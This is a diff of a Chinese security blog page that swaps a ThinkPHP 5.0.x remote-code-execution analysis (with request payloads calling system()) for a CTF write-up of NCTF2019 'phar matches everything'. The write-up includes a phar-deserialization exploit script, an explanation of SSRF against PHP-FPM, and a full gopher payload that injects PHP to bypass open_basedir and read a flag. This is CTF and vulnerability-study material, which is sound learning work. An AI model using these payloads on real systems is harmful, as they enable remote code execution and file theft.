@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">ThinkPHP X 源码分析 | Troy3e</title>
+  <title itemprop="name">[NCTF2019]phar matches everything | Troy3e</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -185,11 +185,11 @@
 
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-719179.png);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-719179.png">
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1141314.png);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1141314.png">
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      ThinkPHP X 源码分析</h1>
+      [NCTF2019]phar matches everything</h1>
       <p class="entry-census">
         <span>
           <a href="">
@@ -201,7 +201,7 @@
         </span>
         <span class="bull">
         ·</span>
-        2021-3-28<span class="bull">
+        2021-4-9<span class="bull">
         ·</span>
       <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
@@ -215,64 +215,167 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <p>复现一下ThinkPHP的各种漏洞，锻炼一下自己分析源码的能力，持续更新。</p>
-<h2 id="ThinkPHP-5-0-x-lt-5-0-23-RCE分析"><a href="#ThinkPHP-5-0-x-lt-5-0-23-RCE分析" class="headerlink" title="ThinkPHP 5.0.x (&lt;=5.0.23) RCE分析"></a>ThinkPHP 5.0.x (&lt;=5.0.23) RCE分析</h2><p>首先查看官方log：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210328215733.png" alt></p>
-<p>改进request的method方法，所以我们diffinity直接对比两个版本区别：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210328220634.png" alt></p>
-<p>在5.0.24中对method作了白名单的限制，只允许$this-&gt;method为常用的几个方法，否则就将其置为POST方法，因此我们的入口点就可以从Request.php跟进。<br>(如果按正常思路寻找的话，index.php-&gt;start.php-&gt;routeCheck-&gt;check 也是可以跟到method的)<br>全局搜索call_user_func，在Request.php中发现在filterValue方法中。</p>
-<pre><code>private function filterValue(&amp;$value, $key, $filters)
-    {
-        $default = array_pop($filters);//弹出并返回 array 数组的最后一个单元，并将数组 array 的长度减一。
-        foreach ($filters as $filter) {
-            if (is_callable($filter)) {//是否能调用
-                $value = call_user_func($filter, $value);
-            } elseif (is_scalar($value)) {//检测变量是否是一个标量
-                if (false !== strpos($filter, &#39;/&#39;)) {//strpos检测字符第一次出现
-                    // 正则过滤
-                    if (!preg_match($filter, $value)) {
-                        // 匹配不成功返回默认值
-                        $value = $default;
-                        break;
-                    }
-                } elseif (!empty($filter)) {
-                    // filter函数不存在时, 则使用filter_var进行过滤
-                    // filter为非整形值时, 调用filter_id取得过滤id
-                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));
-                    if (false === $value) {
-                        $value = $default;
-                        break;
-                    }
-                }
-            }
+          <p>关键词：phar反序列化；ssrf打php-fpm</p>
+<p>WP本来不想发的，但是这道题BUU的环境有一些小变动。希望能帮到一些卡住的人。并且这道题也有很多值得学习的地方。</p>
+<p>github把源码down下来：</p>
+<pre><code>catchmine.php
+&lt;?php
+    class Easytest{
+       protected $test;
+        public function funny_get(){
+            return $this-&gt;test;
         }
-        return $this-&gt;filterExp($value);
     }
-</code></pre><p>自己尝试理解下，首先default被赋予filters的最后一个值，然后一个个尝试filters里剩下的值是否为能调用的函数，是的话直接调用，不是的话检测value里是否是一个标量，是的话继续判断filter里有无/，有则将default即filters的最后一个值赋给它。否则（这个否则是针对filters里是否有/）判断filter是否为空，不为空则进行源码注释里的判断。<br>看似莫名其妙，所以我们全局搜一下调用filterValue的方法：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210328223941.png" alt></p>
-<p>input里面调用了它。<br>无论$data是不是数组最终都会调用filterValue方法，而$filter则会进行过滤器解析，跟进$this-&gt;getFilter方法查看解析过程:</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210328225503.png" alt></p>
-<p>说实话这个我没太理解 暂且继续往下看<br>回到input方法中，array_walk_recursive函数会对第一个数组参数中的每个元素应用第二个参数的函数。在input类方法中，$data中键名作为filterValue(&amp;$value, $key, $filters)中的value,键值作为key,filter作为第三个参数$filters,而当这些传入到filterValue后，call_user_func又是利用filter作为回调的函数，value作为回调函数的参数，因此也就是input方法中的data是回调函数的参数，filter是需要回调的函数。<br>了解之后我们需要查找input方法在何处被调用，全局搜索一下：<br>同文件param方法最后调用该方法并作为返回：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210328234006.png" alt></p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210329004503.png" alt></p>
-<pre><code>$this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));
-</code></pre><p>作为data传入input，跟进$this-&gt;get</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210329000306.png" alt></p>
-<p>如果$this-&gt;get为空，直接将其赋值为$_GET,而最后将$this-&gt;get作为input方法的第一个参数，因此我们可以听过变量覆盖，直接将$this-&gt;get赋值，就此我们控制了回调函数和参数。</p>
-<pre><code>即_method=__construct&amp;filter[]=system&amp;get[]=whoami或者_method=__construct&amp;filter[]=system&amp;route[]=whoami。
-</code></pre><p>重新推一下，我们可以控制Request类所有方法及属性。<br>在param方法里，$method = $this-&gt;method(true);<br>跟一下method</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210329002144.png" alt></p>
-<p>再跟进server：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210329002632.png" alt></p>
-<p>$name的值是REQUEST_METHOD。server()方法中又跟进了input()方法，第一个参数$this-&gt;server可以利用之前__construct()方法进行属性覆盖，因此$this-&gt;server可控。<br>跟进input()方法：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210328223941.png" alt></p>
-<p>$name是REQUEST_METHOD，会进入if (‘’ != $name) {。这些代码就相当于$data=$data[‘REQUEST_METHOD’]。而$data就是可控的$this-&gt;server，因此这里$data也可控。再往下看：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210328225503.png" alt></p>
-<p>相当于$filter=$this-&gt;filter，因此过滤器也可控。接下来就进入了filterValue方法，$data是可控的参数，$filter是可控的函数，再进入利用call_user_func即可RCE。最终构造：</p>
-<pre><code>_method=__construct&amp;filter=system&amp;server[REQUEST_METHOD]=dir
-</code></pre><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210329004703.png" alt></p>
-<p>成功执行，危害极大。</p>
-<p>漏洞原因：method没有进行限制，导致可以任意调用、覆盖类和属性。<br>参考：<a href="https://www.anquanke.com/post/id/222672" target="_blank" rel="noopener">https://www.anquanke.com/post/id/222672</a><br><a href="https://blog.csdn.net/rfrder/article/details/114298944" target="_blank" rel="noopener">https://blog.csdn.net/rfrder/article/details/114298944</a></p>
+    class Main {
+        public $url;
+        public function curl($url){
+            $ch = curl_init();  
+            curl_setopt($ch,CURLOPT_URL,$url);
+            curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
+            $output=curl_exec($ch);
+            curl_close($ch);
+            return $output;
+        }
+
+        public function __destruct(){
+            $this_is_a_easy_test=unserialize($_GET[&#39;careful&#39;]);
+            if($this_is_a_easy_test-&gt;funny_get() === &#39;1&#39;){
+                echo $this-&gt;curl($this-&gt;url);
+           }
+        }    
+    }
+
+    if(isset($_POST[&quot;submit&quot;])) {
+        $check = getimagesize($_POST[&#39;name&#39;]);
+       if($check !== false) {
+            echo &quot;File is an image - &quot; . $check[&quot;mime&quot;] . &quot;.&quot;;
+        } else {
+            echo &quot;File is not an image.&quot;;
+        }
+    }
+    ?&gt;
+</code></pre><p>upload.php</p>
+<pre><code>&lt;?php
+$target_dir = &quot;uploads/&quot;;
+$uploadOk = 1;
+
+$imageFileType=substr($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;],strrpos($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;],&#39;.&#39;)+1,strlen($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;]));
+
+$file_name = md5(time());
+$file_name =substr($file_name, 0, 10).&quot;.&quot;.$imageFileType;
+
+$target_file=$target_dir.$file_name;
+
+    $check = getimagesize($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;]);
+    if($check !== false) {
+        echo &quot;File is an image - &quot; . $check[&quot;mime&quot;] . &quot;.&quot;;
+        $uploadOk = 1;
+    } else {
+        echo &quot;File is not an image.&quot;;
+        $uploadOk = 0;
+    }
+
+
+if (file_exists($target_file)) {
+    echo &quot;Sorry, file already exists.&quot;;
+   $uploadOk = 0;
+}
+if ($_FILES[&quot;fileToUpload&quot;][&quot;size&quot;] &gt; 500000) {
+    echo &quot;Sorry, your file is too large.&quot;;
+    $uploadOk = 0;
+}
+if($imageFileType !== &quot;jpg&quot; &amp;&amp; $imageFileType !== &quot;png&quot; &amp;&amp; $imageFileType !== &quot;gif&quot; &amp;&amp; $imageFileType !== &quot;jpeg&quot;  ) {
+    echo &quot;Sorry, only jpg,png,gif,jpeg are allowed.&quot;;
+    $uploadOk = 0;
+}
+if ($uploadOk == 0) {
+    echo &quot;Sorry, your file was not uploaded.&quot;;
+} else {
+    if (move_uploaded_file($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;], $target_file)) {
+        echo &quot;The file $file_name  has been uploaded to ./uploads/&quot;;
+    } else {
+        echo &quot;Sorry, there was an error uploading your file.&quot;;
+    }
+}
+?&gt;
+</code></pre><p>catchmine.php里面有一个反序列化，先看这里。Main::curl()明显存在SSRF并且可使用文件流造成任意文件读取。但是要触发curl的话就没法控制main里面的url了，所以还需要上传个phar文件，在getimagesize处触发。<br>思路：第一次反序列化，在getimagesize处触发phar反序列化，从而控制url。第二次反序列化，执行curl。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210409003728.png" alt></p>
+<p>exp：（比较简单就不自己写了，来自guoke师傅</p>
+<pre><code>&lt;?php
+class Easytest{
+    protected $test=&#39;1&#39;;
+}
+class Main{
+    public $url=&#39;file:///proc/net/arp&#39;;
+}
+$a=new Easytest();
+echo urlencode(serialize($a));
+$b=new Main();
+@unlink(&quot;phar.phar&quot;);
+$phar=new Phar(&quot;phar.phar&quot;);
+$phar-&gt;startBuffering(); 
+$phar-&gt;setStub(&#39;GIF89a&#39;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); 
+$phar-&gt;setMetadata($b); 
+$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);
+$phar-&gt;stopBuffering();
+?&gt;
+</code></pre><p>第一个要注意的地方，这里etc/hosts没法读到内网ip，只能用/proc/net/arp<br>这里我读到的是10.0.199.2 然后具体哪个会回显PHP-FPM是要自己一个个试的 我试了3、4、5 都没有 然后直接试了11是可以的。</p>
+<p>那么php-fpm是啥呢？跟着p牛的博客学习一下：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
+<p>精简下内容方便查看：</p>
+<p>FPM其实是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。</p>
+<p>FPM按照fastcgi的协议将TCP流解析成真正的数据。</p>
+<p>举个例子，用户访问<a href="http://127.0.0.1/index.php?a=1&amp;b=2，如果web目录是/var/www/html，那么Nginx会将这个请求变成如下key-value对：" target="_blank" rel="noopener">http://127.0.0.1/index.php?a=1&amp;b=2，如果web目录是/var/www/html，那么Nginx会将这个请求变成如下key-value对：</a></p>
+<pre><code>{
+&#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI/1.0&#39;,
+&#39;REQUEST_METHOD&#39;: &#39;GET&#39;,
+&#39;SCRIPT_FILENAME&#39;: &#39;/var/www/html/index.php&#39;,
+&#39;SCRIPT_NAME&#39;: &#39;/index.php&#39;,
+&#39;QUERY_STRING&#39;: &#39;?a=1&amp;b=2&#39;,
+&#39;REQUEST_URI&#39;: &#39;/index.php?a=1&amp;b=2&#39;,
+&#39;DOCUMENT_ROOT&#39;: &#39;/var/www/html&#39;,
+&#39;SERVER_SOFTWARE&#39;: &#39;php/fcgiclient&#39;,
+&#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,
+&#39;REMOTE_PORT&#39;: &#39;12345&#39;,
+&#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,
+&#39;SERVER_PORT&#39;: &#39;80&#39;,
+&#39;SERVER_NAME&#39;: &quot;localhost&quot;,
+&#39;SERVER_PROTOCOL&#39;: &#39;HTTP/1.1&#39;
+}
+</code></pre><p>这个数组其实就是PHP中$_SERVER数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充$_SERVER数组，也是告诉fpm：“我要执行哪个PHP文件”。</p>
+<p>PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行SCRIPT_FILENAME的值指向的PHP文件，也就是/var/www/html/index.php。</p>
+<p>Nginx（IIS7）解析漏洞：fpm发现/var/www/html/favicon.ico/.php不存在，则去掉/.php，再判断/var/www/html/favicon.ico是否存在。显然这个文件是存在的，于是被作为PHP文件执行，导致解析漏洞。</p>
+<p>在fpm某个版本之前，我们可以将SCRIPT_FILENAME的值指定为任意后缀文件，比如/etc/passwd；但后来，fpm的默认配置中增加了一个选项security.limit_extensions，只能以phpx结尾。由于这个配置项的限制，如果想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。</p>
+<p>那么，为什么我们控制fastcgi协议通信的内容，就能执行任意PHP代码呢？</p>
+<p>理论上当然是不可以的，即使我们能控制SCRIPT_FILENAME，让fpm执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。</p>
+<p>但PHP是一门强大的语言，PHP.INI中有两个有趣的配置项，auto_prepend_file和auto_append_file。</p>
+<p>auto_prepend_file是告诉PHP，在执行目标文件之前，先包含auto_prepend_file中指定的文件；auto_append_file是告诉PHP，在执行完成目标文件后，包含auto_append_file指向的文件。</p>
+<p>那么就有趣了，假设我们设置auto_prepend_file为php://input，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（当然，还需要开启远程文件包含选项allow_url_include）</p>
+<p>那么，我们怎么设置auto_prepend_file的值？</p>
+<p>这又涉及到PHP-FPM的两个环境变量，PHP_VALUE和PHP_ADMIN_VALUE。这两个环境变量就是用来设置PHP配置项的，PHP_VALUE可以设置模式为PHP_INI_USER和PHP_INI_ALL的选项，PHP_ADMIN_VALUE可以设置所有选项。（disable_functions除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）</p>
+<p>所以，我们最后传入如下环境变量：</p>
+<pre><code>{
+&#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI/1.0&#39;,
+&#39;REQUEST_METHOD&#39;: &#39;GET&#39;,
+&#39;SCRIPT_FILENAME&#39;: &#39;/var/www/html/index.php&#39;,
+&#39;SCRIPT_NAME&#39;: &#39;/index.php&#39;,
+&#39;QUERY_STRING&#39;: &#39;?a=1&amp;b=2&#39;,
+&#39;REQUEST_URI&#39;: &#39;/index.php?a=1&amp;b=2&#39;,
+&#39;DOCUMENT_ROOT&#39;: &#39;/var/www/html&#39;,
+&#39;SERVER_SOFTWARE&#39;: &#39;php/fcgiclient&#39;,
+&#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,
+&#39;REMOTE_PORT&#39;: &#39;12345&#39;,
+&#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,
+&#39;SERVER_PORT&#39;: &#39;80&#39;,
+&#39;SERVER_NAME&#39;: &quot;localhost&quot;,
+&#39;SERVER_PROTOCOL&#39;: &#39;HTTP/1.1&#39;
+&#39;PHP_VALUE&#39;: &#39;auto_prepend_file = php://input&#39;,
+&#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include = On&#39;
+}
+</code></pre><p>exp：<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p>
+<p>最后构造gopher协议即可<br>payload：</p>
+<pre><code>gopher://10.0.199.11:9000/_%01%01%F6%FD%00%08%00%00%00%01%00%00%00%00%00%00%01%04%F6%FD%01%DC%00%00%0E%03CONTENT_LENGTH203%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%F6%FD%00%00%00%00%01%05%F6%FD%00%CB%00%00%3C%3Fphp%20mkdir%28%27/tmp/fuck%27%29%3Bchdir%28%27/tmp/fuck%27%29%3Bini_set%28%27open_basedir%27%2C%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bini_set%28%27open_basedir%27%2C%27/%27%29%3Bprint_r%28scandir%28%27/%27%29%29%3Breadfile%28%27/flag%27%29%3B%3F%3E%01%05%F6%FD%00%00%00%00
+</code></pre><p>里面还有一个知识点，open_basedir的绕过和disable_function的限制。<br>四个执行函数都被ban了，用readfile代替即可。<br>open_basedir绕过的姿势网上有很多，这里我用的是通过chdir()和ini_set()来进行跨路径访问，网上找姿势的时候记得这里题目是php7，有些老版本的是不行的。<br>参考链接：<a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">https://xz.aliyun.com/t/4720</a></p>
+<p>好耶 学到许多</p>
 
         </div>
         <!-- .entry-content -->
@@ -301,36 +404,19 @@
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2021/03/29/SSTI比较离谱的绕过/" rel="prev">
-              <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1139581.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1139581.jpg">
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                SSTI比较离谱的绕过</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="/2021/03/28/BUU近期刷题记录/" rel="next">
+            <a href="/2021/04/09/ThinkPHP X 源码分析/" rel="next">
               <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1139481.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1139481.jpg">
+                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-719179.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-719179.png">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                BUU近期刷题记录</h3>
+                ThinkPHP X 源码分析</h3>
                 <hr>
               </div>
             </a>
